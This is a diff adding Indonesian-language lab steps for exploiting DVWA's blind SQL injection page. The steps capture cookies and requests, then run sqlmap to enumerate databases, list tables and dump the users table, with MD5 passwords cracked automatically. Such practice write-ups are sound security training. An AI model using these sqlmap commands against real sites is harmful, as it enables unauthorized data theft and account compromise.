@@ -58,4 +58,52 @@ Cara:
 
 ![change diff](src/diff_blind.png)
 
-2. 
+2. Buka tab `SQL Injection (Blind)` kemudian inspect, pilih tab network, lalu klik submit
+
+![network](src/network_blind.png)
+
+3. Pilih data teratas dan catat cookies dan raw requestnya
+>Pilih tab `Cookies` pada bagian bawah untuk melihat cookies yang ada
+>![cookies](src/cookies_blind.png)
+
+>Pilih tab `Request` pada bagian bawah lalu tekan togle `Raw` untuk melihat raw request yang dikirimkan
+>![request](src/request_blind.png)
+
+>catat dengan format yang sesuai pada gambar dibawah
+>![note](src/note_blind.png)
+
+4. Buka terminal dan jalankan command sqlmap berikut:
+```
+sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" --dbms --batch
+```
+>Sesuaikan command dengan data yang didapatkan sebelumnya
+>
+>`[url]` = url dari laman DVWA yang saat ini dibuka 
+>
+>`[cookies]` = cookies yang telah di catat sesuai format
+>
+>`[request]` = raw request yang telah dicatat sesuai format 
+
+![sqlmap1](src/sqlmap1_blind.png)
+Didapatkan daftar database yang ada pada server
+```
+[*] dvwa
+[*] information_schema
+```
+
+5. Ubah command sqlmap sebelumnya menjadi:
+```
+sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa --tables --batch
+```
+>command di atas akan menampilkan tabel yang ada dalam database dvwa
+
+![sqlmap2](src/sqlmap2_blind.png)
+
+6. Ubah lagi command sqlmap sebelumnya untuk menampilkan data dalam tabel users
+```
+sqlmap -u "[url]" --cookie="[cookies]" --data="[request]" -D dvwa -T users --dump --batch
+```
+>--dump digunakan untuk menampilkan semua data didalam sebuah tabel
+
+![sqlmap3](src/sqlmap3_blind.png)
+>karena enkripsi password yang sederhana menggunakan `md5`, sqlmap secara otomatis mendekripsi semua password yang ada
